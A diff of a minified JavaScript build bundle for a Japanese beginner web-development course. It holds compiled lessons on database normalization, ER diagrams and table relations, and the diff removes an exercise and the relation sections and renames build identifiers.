border",children:"T001"}),e.jsx("td",{className:"p-2 border",children:"山田先生"}),e.jsx("td",{className:"p-2 border",children:"D01"}),e.jsx("td",{className:"p-2 border text-red-600",children:"理学部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"T002"}),e.jsx("td",{className:"p-2 border",children:"佐藤先生"}),e.jsx("td",{className:"p-2 border",children:"D01"}),e.jsx("td",{className:"p-2 border text-red-600",children:"理学部"})]})]})]})}),e.jsx("div",{className:"text-xs text-red-600 mt-2",children:"問題: 学部名は学部IDに依存（推移的依存: 教師ID → 学部ID → 学部名）"})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"第3正規形（OK）- テーブルを分割"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"教師テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"教師ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"教師名"}),e.jsx("th",{className:"p-1 border text-xs",children:"学部ID"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"T001"}),e.jsx("td",{className:"p-1 border text-xs",children:"山田先生"}),e.jsx("td",{className:"p-1 border text-xs",children:"D01"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"T002"}),e.jsx("td",{className:"p-1 border text-xs",children:"佐藤先生"}),e.jsx("td",{className:"p-1 border text-xs",children:"D01"})]})]})]})]}),e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"学部テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"学部ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"学部名"})]})}),e.jsx("tbody",{children:e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"D01"}),e.jsx("td",{className:"p-1 border text-xs",children:"理学部"})]})})]})]})]})]})]})})]}),`
-`,e.jsxs(n,{summary:"[演習] 非正規系データの正規化",children:[e.jsx(r,{type:"warning",title:"課題",children:e.jsx(s.p,{children:"書籍とその販売店・販売地を管理しているシートがあります。サンプルデータを参考に、draw.io で正規化されたER図を作成してください。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"サンプルデータ："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"書籍ID"}),e.jsx(s.th,{children:"書籍名"}),e.jsx(s.th,{children:"著者"}),e.jsx(s.th,{children:"出版年"}),e.jsx(s.th,{children:"販売店"}),e.jsx(s.th,{children:"販売店所在地"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"データベース入門"}),e.jsx(s.td,{children:"山田太郎"}),e.jsx(s.td,{children:"2020"}),e.jsx(s.td,{children:"書店A"}),e.jsx(s.td,{children:"東京"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"データベース入門"}),e.jsx(s.td,{children:"山田太郎"}),e.jsx(s.td,{children:"2020"}),e.jsx(s.td,{children:"書店B"}),e.jsx(s.td,{children:"大阪"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"プログラミングの基礎"}),e.jsx(s.td,{children:"佐藤花子"}),e.jsx(s.td,{children:"2021"}),e.jsx(s.td,{children:"書店A"}),e.jsx(s.td,{children:"東京"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"3"}),e.jsx(s.td,{children:"統計学入門"}),e.jsx(s.td,{children:"伊藤一郎"}),e.jsx(s.td,{children:"2019"}),e.jsx(s.td,{children:"書店C"}),e.jsx(s.td,{children:"福岡"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"3"}),e.jsx(s.td,{children:"統計学入門"}),e.jsx(s.td,{children:"伊藤一郎"}),e.jsx(s.td,{children:"2019"}),e.jsx(s.td,{children:"書店D"}),e.jsx(s.td,{children:"札幌"})]})]})]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"条件："})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"リレーション / キー の記載はなくて良い"}),`
-`,e.jsx(s.li,{children:"日本語での記載で良い"}),`
-`]}),e.jsxs(r,{type:"tip",title:"追加チャレンジ",children:[e.jsx(s.p,{children:"課題が終わったら以下にもチャレンジしてみよう！"}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"テーブル名 / カラム名 を英単語にしてみよう"}),`
-`,e.jsx(s.li,{children:"キー（PK / FK）を割り振ってみよう"}),`
-`,e.jsx(s.li,{children:"リレーションを定義してみよう"}),`
-`]})]}),e.jsxs(n,{summary:"[補足] 回答例（演習が完了してから見てください）",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化後のテーブル構成："})}),e.jsx(i,{children:`
-erDiagram
-  books {
-      int book_id PK
-      varchar title
-      varchar author
-      int publish_year
-  }
-
-  stores {
-      int store_id PK
-      varchar store_name
-      varchar location
-  }
-
-  book_stores {
-      int id PK
-      int book_id FK
-      int store_id FK
-  }
-
-  books ||--o{ book_stores : "販売"
-  stores ||--o{ book_stores : "取扱"
-`}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ポイント："})}),e.jsxs(s.ol,{children:[`
-`,e.jsx(s.li,{children:"書籍情報（books）と販売店情報（stores）を分離"}),`
-`,e.jsx(s.li,{children:"多対多の関係を中間テーブル（book_stores）で表現"}),`
-`,e.jsx(s.li,{children:"重複データが排除され、データ整合性が保たれる"}),`
-`]})]})]}),`
-`,e.jsx(s.h2,{children:"リレーションの詳細"}),`
-`,e.jsxs(n,{summary:"1対1（One-to-One）リレーション",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"解説："}),`
-一つのレコードが別のテーブルのただ一つのレコードとだけ関連づけられる関係。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"定義方法："}),`
-主キーを外部キーとして別のテーブルに設定する。`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実例："})}),e.jsx(i,{children:`
-erDiagram
-  users {
-      int user_id PK
-      varchar username
-      varchar email
-  }
-
-  user_profiles {
-      int profile_id PK
-      int user_id FK
-      varchar address
-      date birthday
-      varchar phone
-  }
-
-  users ||--|| user_profiles : "has"
-`}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"1対1リレーションの使用例"}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"ユーザー"})," と ",e.jsx("strong",{children:"ユーザープロフィール"}),e.jsx("br",{}),`
-1人のユーザーには1つのプロフィールが対応し、1つのプロフィールは1人のユーザーにのみ属する`]})})]})}),e.jsx(r,{type:"tip",title:"1対1リレーションを使う場面",children:e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"テーブルを機能的に分割したい場合"}),`
-`,e.jsx(s.li,{children:"アクセス頻度の異なるデータを分離したい場合"}),`
-`,e.jsx(s.li,{children:"セキュリティ上の理由でデータを分離したい場合"}),`
-`]})})]}),`
-`,e.jsxs(n,{summary:"1対多（One-to-Many）リレーション",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"解説："}),`
-一つのレコードが別のテーブルの複数のレコードと関連づけられる関係。最も一般的なリレーションタイプです。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"定義方法："}),`
-"多" 側のテーブルに "一" 側のテーブルの主キーを外部キーとして設定する。`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実例："})}),e.jsx(i,{children:`
-erDiagram
-  departments {
-      int dept_id PK
-      varchar dept_name
-  }
-
-  employees {
-      int emp_id PK
-      varchar emp_name
-      int dept_id FK
-  }
-
-  departments ||--o{ employees : "所属"
-`}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"1対多リレーションの使用例"}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"部署"})," と ",e.jsx("strong",{children:"社員"}),e.jsx("br",{}),`
-1つの部署には複数の社員が所属できるが、1人の社員は1つの部署にのみ所属する`]})})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"その他の例："})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"顧客 と 注文（1人の顧客は複数の注文を行える）"}),`
-`,e.jsx(s.li,{children:"カテゴリ と 商品（1つのカテゴリには複数の商品が属する）"}),`
-`,e.jsx(s.li,{children:"著者 と 記事（1人の著者は複数の記事を執筆できる）"}),`
-`]})]}),`
-`,e.jsxs(n,{summary:"多対多（Many-to-Many）リレーション",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"解説："}),`
-複数のレコードが別のテーブルの複数のレコードと関連づけられる関係。この関係を直接的に表現することはできないため、`,e.jsx(s.strong,{children:"中間テーブル"}),"を用いて関連づけます。"]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"中間テーブルとは："}),`
-二つのテーブル間の多対多の関係を管理するために使用されるテーブル。各レコードは、関連する二つのテーブルのレコード間のリンクを表します。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"定義方法："}),`
-中間テーブルには、関連する二つのテーブルの主キーを外部キーとして含める。これらの外部キーの組み合わせが中間テーブルのユニークキーまたはプライマリキーになります。`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実例："})}),e.jsx(i,{children:`
-erDiagram
-  students {
-      int student_id PK
-      varchar name
-  }
-
-  courses {
-      int course_id PK
-      varchar course_name
-  }
-
-  enrollments {
-      int enrollment_id PK
-      int student_id FK
-      int course_id FK
-      date enrolled_at
-  }
-
-  students ||--o{ enrollments : "受講"
-  courses ||--o{ enrollments : "開講"
-`}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800 mb-2",children:"多対多リレーションの使用例"}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"生徒"})," と ",e.jsx("strong",{children:"授業"}),e.jsx("br",{}),`
-1人の生徒は複数の授業を受講でき、1つの授業には複数の生徒が参加できる`,e.jsx("br",{}),`
-→ `,e.jsx("strong",{children:"中間テーブル（enrollments）"})," で関係を管理"]})})]})}),e.jsx(r,{type:"warning",title:"中間テーブルの重要性",children:e.jsx(s.p,{children:"多対多リレーションは必ず中間テーブルを使って実装します。中間テーブルには追加情報（例：登録日、ステータスなど）を持たせることもできます。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"その他の例："})}),e.jsxs(s.ul,{children:[`
-`,e.jsx(s.li,{children:"商品 と タグ（1つの商品に複数のタグ、1つのタグは複数の商品に付与）"}),`
-`,e.jsx(s.li,{children:"ユーザー と ロール（1人のユーザーに複数のロール、1つのロールは複数のユーザーに割当）"}),`
-`]})]}),`
 `,e.jsx(s.h2,{children:"まとめ"}),`
-`,e.jsx(n,{summary:"今回学んだ重要なポイント",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データモデリング"}),e.jsx("div",{className:"text-sm text-slate-600",children:"エンティティとリレーションシップでデータを整理する基本概念"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 17V7m0 10a2 2 0 01-2 2H5a2 2 0 01-2-2V7a2 2 0 012-2h2a2 2 0 012 2m0 10a2 2 0 002 2h2a2 2 0 002-2M9 7a2 2 0 012-2h2a2 2 0 012 2m0 10V7m0 10a2 2 0 002 2h2a2 2 0 002-2V7a2 2 0 00-2-2h-2a2 2 0 00-2 2"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"ER図"}),e.jsx("div",{className:"text-sm text-slate-600",children:"draw.ioを使ったER図の作成方法とテーブル設計の可視化"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7c0-2.21-3.582-4-8-4s-8 1.79-8 4z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"正規化（1NF〜3NF）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データの重複を排除し、整合性の高いテーブル設計"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"リレーション"}),e.jsx("div",{className:"text-sm text-slate-600",children:"1対1、1対多、多対多の関係性と中間テーブルの活用"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"JOIN・GROUP BY"}),e.jsx("div",{className:"text-sm text-slate-600",children:"複数テーブルの結合と集計・分析クエリの実践"})]})]})]})})})]})}function ae(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(D,{...d})}):D(d)}function g(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const xe=Object.freeze(Object.defineProperty({__proto__:null,default:ae},Symbol.toStringTag,{value:"Module"}));function O(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||v("Callout"),n||v("Details"),l||v("Infographic"),i||v("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"Webアプリケーション入門"}),`
+`,e.jsx(n,{summary:"今回学んだ重要なポイント",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データモデリング"}),e.jsx("div",{className:"text-sm text-slate-600",children:"エンティティとリレーションシップでデータを整理する基本概念"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 17V7m0 10a2 2 0 01-2 2H5a2 2 0 01-2-2V7a2 2 0 012-2h2a2 2 0 012 2m0 10a2 2 0 002 2h2a2 2 0 002-2M9 7a2 2 0 012-2h2a2 2 0 012 2m0 10V7m0 10a2 2 0 002 2h2a2 2 0 002-2V7a2 2 0 00-2-2h-2a2 2 0 00-2 2"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"ER図"}),e.jsx("div",{className:"text-sm text-slate-600",children:"draw.ioを使ったER図の作成方法とテーブル設計の可視化"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7c0-2.21-3.582-4-8-4s-8 1.79-8 4z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"正規化（1NF〜3NF）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データの重複を排除し、整合性の高いテーブル設計"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"リレーション"}),e.jsx("div",{className:"text-sm text-slate-600",children:"1対1、1対多、多対多の関係性と中間テーブルの活用"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-red-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"INNER JOIN"}),e.jsx("div",{className:"text-sm text-slate-600",children:"正規化されたテーブルからデータを結合して取得する方法"})]})]})]})})})]})}function ae(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(D,{...d})}):D(d)}function g(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const xe=Object.freeze(Object.defineProperty({__proto__:null,default:ae},Symbol.toStringTag,{value:"Module"}));function H(d){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...t(),...d.components},{Callout:r,Details:n,Infographic:l,Mermaid:i}=s;return r||v("Callout"),n||v("Details"),l||v("Infographic"),i||v("Mermaid"),e.jsxs(e.Fragment,{children:[e.jsx(s.h1,{children:"Webアプリケーション入門"}),`
 `,e.jsx(s.p,{children:"これから皆さんはWebアプリケーションの仕組みを学習していきます。Webアプリとは何か？を整理した上で学習を始めましょう！"}),`
 `,e.jsx(n,{summary:"今回のゴール",children:e.jsxs(s.ul,{children:[`
 `,e.jsx(s.li,{children:"Webアプリケーションとは何かを理解する"}),`
@@ -5821,4 +5568,4 @@ graph TD
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"CSS基礎"}),"：見た目を美しくデザインする"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"JavaScript基礎"}),"：動的な機能を実装する"]}),`
 `,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"実践プロジェクト"}),"：学んだ技術を組み合わせてWebアプリを作成する"]}),`
-`]})})]})}function oe(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(O,{...d})}):O(d)}function v(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const he=Object.freeze(Object.defineProperty({__proto__:null,default:oe},Symbol.toStringTag,{value:"Module"})),f=Object.assign({"../lessons/css.mdx":B,"../lessons/github.mdx":V,"../lessons/html.mdx":z,"../lessons/introduction-ai.mdx":J,"../lessons/introduction.mdx":Q,"../lessons/js01-変数・計算・条件分岐.mdx":K,"../lessons/js02-配列・for文・localStorage.mdx":X,"../lessons/js03-firebase.mdx":ee,"../lessons/js04-API.mdx":ne,"../lessons/php01-環境設定とPHPの基礎.mdx":le,"../lessons/php02-データベース連携（CRUD）.mdx":ie,"../lessons/php03-ユーザ管理.mdx":ce,"../lessons/php04-データベース設計基礎.mdx":xe,"../lessons/webapp.mdx":he});function je(){var s;const d=[];for(const r in f){const n=f[r],l=r.replace("../lessons/","").replace(/\.mdx$/,""),i=((s=n.frontmatter)==null?void 0:s.title)||l;d.push({slug:l,title:i})}return d.sort((r,n)=>r.slug.localeCompare(n.slug))}async function ue(){const{publicSlugs:d}=await R(async()=>{const{publicSlugs:n}=await import("./public-lessons-B2ilRkP2.js");return{publicSlugs:n}},[]),s=je(),r=[];for(const n of d){const l=s.find(i=>i.slug===n);l&&r.push(l)}return r}function ge(d){const s=`../lessons/${d}.mdx`,r=f[s];return r?r.default:null}export{ge as a,ue as b,je as g};
+`]})})]})}function oe(d={}){const{wrapper:s}={...t(),...d.components};return s?e.jsx(s,{...d,children:e.jsx(H,{...d})}):H(d)}function v(d,s){throw new Error("Expected component `"+d+"` to be defined: you likely forgot to import, pass, or provide it.")}const he=Object.freeze(Object.defineProperty({__proto__:null,default:oe},Symbol.toStringTag,{value:"Module"})),f=Object.assign({"../lessons/css.mdx":W,"../lessons/github.mdx":z,"../lessons/html.mdx":F,"../lessons/introduction-ai.mdx":U,"../lessons/introduction.mdx":Q,"../lessons/js01-変数・計算・条件分岐.mdx":q,"../lessons/js02-配列・for文・localStorage.mdx":Y,"../lessons/js03-firebase.mdx":ee,"../lessons/js04-API.mdx":ne,"../lessons/php01-環境設定とPHPの基礎.mdx":le,"../lessons/php02-データベース連携（CRUD）.mdx":ie,"../lessons/php03-ユーザ管理.mdx":ce,"../lessons/php04-データベース設計基礎.mdx":xe,"../lessons/webapp.mdx":he});function je(){var s;const d=[];for(const r in f){const n=f[r],l=r.replace("../lessons/","").replace(/\.mdx$/,""),i=((s=n.frontmatter)==null?void 0:s.title)||l;d.push({slug:l,title:i})}return d.sort((r,n)=>r.slug.localeCompare(n.slug))}async function ue(){const{publicSlugs:d}=await B(async()=>{const{publicSlugs:n}=await import("./public-lessons-B2ilRkP2.js");return{publicSlugs:n}},[]),s=je(),r=[];for(const n of d){const l=s.find(i=>i.slug===n);l&&r.push(l)}return r}function ge(d){const s=`../lessons/${d}.mdx`,r=f[s];return r?r.default:null}export{ge as a,ue as b,je as g};
